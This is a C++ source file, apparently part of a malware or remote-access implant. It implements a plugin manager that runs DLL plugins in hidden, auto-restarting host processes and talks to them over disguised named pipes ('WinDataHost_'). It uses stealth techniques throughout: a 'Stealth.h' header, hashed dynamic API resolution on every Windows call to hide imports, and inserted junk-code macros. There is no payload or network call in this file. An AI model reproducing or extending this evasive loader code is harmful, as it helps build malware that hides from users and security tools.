#include "PluginManager.h"
#include "NetworkManager.h"
#include "Logger.h"
#include "FileUtils.h"
#include "Stealth.h"
#include <filesystem>
#include <chrono>

namespace fs = std::filesystem;

static constexpr DWORD kPipeBufferSize = 4096;
static constexpr DWORD kPipeWriteTimeoutMs = 2000;
static constexpr DWORD kIoPollIntervalMs = 100;
static constexpr DWORD kReconnectDelayMs = 1000;
static constexpr int   kRestartDelaySec = 5;

struct ScopedHandle {
    HANDLE h = INVALID_HANDLE_VALUE;
    ScopedHandle() = default;
    explicit ScopedHandle(HANDLE h) noexcept : h(h) {}
    ~ScopedHandle() noexcept { close(); }
    ScopedHandle(const ScopedHandle&) = delete;
    ScopedHandle& operator=(const ScopedHandle&) = delete;
    ScopedHandle(ScopedHandle&& o) noexcept : h(std::exchange(o.h, INVALID_HANDLE_VALUE)) {}
    [[nodiscard]] HANDLE release() noexcept { return std::exchange(h, INVALID_HANDLE_VALUE); }
    void reset(HANDLE newH = INVALID_HANDLE_VALUE) noexcept { close(); h = newH; }
    bool valid() const noexcept { return h && h != INVALID_HANDLE_VALUE; }
    operator HANDLE() const noexcept { return h; }
private:
    void close() noexcept { if (valid()) { CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, h); h = INVALID_HANDLE_VALUE; } }
};

static std::wstring MakePipeName(const std::wstring& dllName) {
    std::wstring safe = dllName;
    for (wchar_t& ch : safe)
        if (ch == L'\\' || ch == L'/' || ch == L':') ch = L'_';
    return L"\\\\.\\pipe\\WinDataHost_" + safe;
}

static ScopedHandle MakeEvent() {
    return ScopedHandle{ CALL_API(Hashes::kernel32, Hashes::CreateEventW, CreateEventW, nullptr, TRUE, FALSE, nullptr) };
}

PluginManager::PluginManager() = default;
PluginManager::~PluginManager() { UnloadAll(); }

void PluginManager::LoadPlugin(const std::wstring& dllPath) {
    const std::wstring dllName = fs::path(dllPath).filename().wstring();
    std::shared_ptr<PluginInstance> oldInstance;
    {
        std::lock_guard lock(managerMutex);
        auto it = plugins.find(dllName);
        if (it != plugins.end()) {
            oldInstance = std::move(it->second);
            plugins.erase(it);
        }
    }
    if (oldInstance) { oldInstance->Stop(); oldInstance.reset(); }
    auto instance = std::make_shared<PluginInstance>(dllPath);
    {
        std::lock_guard lock(managerMutex);
        plugins[dllName] = instance;
    }
    instance->monitorThread = std::thread(&PluginManager::PluginHostThread, this, instance);
    instance->pipeThread = std::thread(&PluginManager::PipeThread, this, instance);
    Logger::Log(L"Plugin loaded: " + dllName);
}

void PluginManager::UnloadAll() {
    std::vector<std::shared_ptr<PluginInstance>> toStop;
    {
        std::lock_guard lock(managerMutex);
        for (auto& [name, inst] : plugins) toStop.push_back(std::move(inst));
        plugins.clear();
    }
    for (auto& inst : toStop) inst->Stop();
    Logger::Log(L"All plugins unloaded.");
}

bool PluginManager::IsPluginRunning(const std::wstring& dllName) {
    std::shared_ptr<PluginInstance> inst;
    {
        std::lock_guard lock(managerMutex);
        auto it = plugins.find(dllName);
        if (it == plugins.end()) return false;
        inst = it->second;
    }
    HANDLE proc = inst->hProcess.load();
    if (!proc) return false;
    DWORD exitCode = 0;
    return CALL_API(Hashes::kernel32, Hashes::GetExitCodeProcess, GetExitCodeProcess, proc, &exitCode) && exitCode == STILL_ACTIVE;
}

bool PluginManager::SendToPlugin(const std::wstring& dllName, const std::wstring& message) {
    std::shared_ptr<PluginInstance> inst;
    {
        std::lock_guard lock(managerMutex);
        auto it = plugins.find(dllName);
        if (it != plugins.end()) inst = it->second;
    }
    if (!inst || !inst->pipeConnected.load()) return false;
    HANDLE hPipe = inst->hPipe.load();
    if (hPipe == INVALID_HANDLE_VALUE) return false;
    const std::string msg = FileUtils::WStringToString(message);
    if (msg.empty()) return true;
    ScopedHandle ev = MakeEvent();
    if (!ev.valid()) return false;
    OVERLAPPED ov = {};
    ov.hEvent = ev;
    DWORD written = 0;
    BOOL ok = CALL_API(Hashes::kernel32, Hashes::WriteFile, WriteFile, hPipe, msg.data(), static_cast<DWORD>(msg.size()), nullptr, &ov);
    if (!ok) {
        if (GetLastError() != ERROR_IO_PENDING) return false;
        const DWORD waited = CALL_API(Hashes::kernel32, Hashes::WaitForSingleObject, WaitForSingleObject, ev, kPipeWriteTimeoutMs);
        if (waited != WAIT_OBJECT_0) {
            CALL_API(Hashes::kernel32, Hashes::CancelIoEx, CancelIoEx, hPipe, &ov);
            CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, hPipe, &ov, &written, TRUE);
            return false;
        }
        ok = CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, hPipe, &ov, &written, FALSE);
    } else {
        ok = CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, hPipe, &ov, &written, FALSE);
    }
    return ok && written == static_cast<DWORD>(msg.size());
}

void PluginManager::PluginHostThread(std::shared_ptr<PluginInstance> instance) {
    const std::wstring hostPath = FileUtils::GetExecutablePath();
    const std::wstring dllName = fs::path(instance->dllPath).filename().wstring();
    const std::wstring cmdTemplate = L"\"" + hostPath + L"\" --host \"" + instance->dllPath + L"\"";
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    while (instance->running) {
        std::wstring cmd = cmdTemplate;
        PROCESS_INFORMATION pi = {};
        if (!CALL_API(Hashes::kernel32, Hashes::CreateProcessW, CreateProcessW, nullptr, cmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            std::unique_lock lk(instance->instanceMutex);
            instance->shutdownCV.wait_for(lk, std::chrono::seconds(kRestartDelaySec), [&] { return !instance->running.load(); });
            continue;
        }
        CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, pi.hThread);
        ScopedHandle procGuard(pi.hProcess);
        instance->hProcess.store(pi.hProcess);
        while (instance->running) {
            if (CALL_API(Hashes::kernel32, Hashes::WaitForSingleObject, WaitForSingleObject, procGuard, 500) != WAIT_TIMEOUT) break;
        }
        DWORD exitCode = 0;
        CALL_API(Hashes::kernel32, Hashes::GetExitCodeProcess, GetExitCodeProcess, procGuard, &exitCode);
        instance->hProcess.store(nullptr);
        procGuard.reset();
        if (!instance->running) break;
        if (exitCode != 0) {
            instance->running = false;
            instance->shutdownCV.notify_all();
            break;
        }
        std::unique_lock lk(instance->instanceMutex);
        instance->shutdownCV.wait_for(lk, std::chrono::seconds(kRestartDelaySec), [&] { return !instance->running.load(); });
    }
}

void PluginManager::PipeThread(std::shared_ptr<PluginInstance> instance) {
    const std::wstring dllName = fs::path(instance->dllPath).filename().wstring();
    const std::wstring pipeName = MakePipeName(dllName);
    char readBuf[kPipeBufferSize];
    while (instance->running) {
        ScopedHandle pipeGuard{
            (HANDLE)CALL_API(Hashes::kernel32, Hashes::CreateNamedPipeW, CreateNamedPipeW,
                pipeName.c_str(), PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
                PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,
                1, kPipeBufferSize, kPipeBufferSize, 0, nullptr)
        };
        if (!pipeGuard.valid()) {
            std::unique_lock lk(instance->instanceMutex);
            instance->shutdownCV.wait_for(lk, std::chrono::milliseconds(kReconnectDelayMs), [&] { return !instance->running.load(); });
            continue;
        }
        ScopedHandle connEvent = MakeEvent();
        if (!connEvent.valid()) continue;
        OVERLAPPED connOv = {}; connOv.hEvent = connEvent;
        bool connected = false;
        BOOL connRet = CALL_API(Hashes::kernel32, Hashes::ConnectNamedPipe, ConnectNamedPipe, pipeGuard, &connOv);
        if (connRet || GetLastError() == ERROR_PIPE_CONNECTED) { connected = true; }
        else if (GetLastError() == ERROR_IO_PENDING) {
            while (instance->running) {
                if (CALL_API(Hashes::kernel32, Hashes::WaitForSingleObject, WaitForSingleObject, connEvent, kIoPollIntervalMs) == WAIT_OBJECT_0) {
                    DWORD dummy = 0; connected = CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, pipeGuard, &connOv, &dummy, FALSE) == TRUE;
                    break;
                }
            }
        }
        if (!instance->running || !connected) {
            CALL_API(Hashes::kernel32, Hashes::CancelIoEx, CancelIoEx, pipeGuard, &connOv);
            CALL_API(Hashes::kernel32, Hashes::DisconnectNamedPipe, DisconnectNamedPipe, pipeGuard);
            continue;
        }
        instance->hPipe.store(pipeGuard.h);
        instance->pipeConnected.store(true);
        ScopedHandle readEvent = MakeEvent();
        if (!readEvent.valid()) {
            instance->pipeConnected.store(false); instance->hPipe.store(INVALID_HANDLE_VALUE);
            CALL_API(Hashes::kernel32, Hashes::DisconnectNamedPipe, DisconnectNamedPipe, pipeGuard);
            continue;
        }
        OVERLAPPED readOv = {}; readOv.hEvent = readEvent;
        std::string messageAccum;
        while (instance->running) {
            JUNK_CODE_SMALL;
            CALL_API(Hashes::kernel32, Hashes::ResetEvent, ResetEvent, readEvent);
            DWORD bytesRead = 0;
            BOOL readRet = CALL_API(Hashes::kernel32, Hashes::ReadFile, ReadFile, pipeGuard, readBuf, sizeof(readBuf) - 1, &bytesRead, &readOv);
            if (!readRet && GetLastError() != ERROR_IO_PENDING) break;
            bool ioCompleted = false;
            while (instance->running) {
                if (CALL_API(Hashes::kernel32, Hashes::WaitForSingleObject, WaitForSingleObject, readEvent, kIoPollIntervalMs) == WAIT_OBJECT_0) {
                    ioCompleted = true; break;
                }
            }
            if (!ioCompleted) { CALL_API(Hashes::kernel32, Hashes::CancelIoEx, CancelIoEx, pipeGuard, &readOv); break; }
            BOOL overlappedOk = CALL_API(Hashes::kernel32, Hashes::GetOverlappedResult, GetOverlappedResult, pipeGuard, &readOv, &bytesRead, FALSE);
            if (bytesRead > 0) messageAccum.append(readBuf, bytesRead);
            if (!overlappedOk) { if (GetLastError() == ERROR_MORE_DATA) continue; break; }
            if (!messageAccum.empty()) { Logger::Log(L"[" + dllName + L"] " + FileUtils::StringToWString(messageAccum)); messageAccum.clear(); }
        }
        instance->pipeConnected.store(false); instance->hPipe.store(INVALID_HANDLE_VALUE);
        CALL_API(Hashes::kernel32, Hashes::DisconnectNamedPipe, DisconnectNamedPipe, pipeGuard);
        if (instance->running) {
            std::unique_lock lk(instance->instanceMutex);
            instance->shutdownCV.wait_for(lk, std::chrono::milliseconds(kReconnectDelayMs), [&] { return !instance->running.load(); });
        }
    }
}
void PluginManager::BroadcastToPlugins(const std::wstring& message) {
    std::vector<std::wstring> activePlugins;
    {
        std::lock_guard lock(managerMutex);
        for (const auto& [name, inst] : plugins) { if (inst && inst->pipeConnected.load()) activePlugins.push_back(name); }
    }
    for (const std::wstring& name : activePlugins) SendToPlugin(name, message);
}
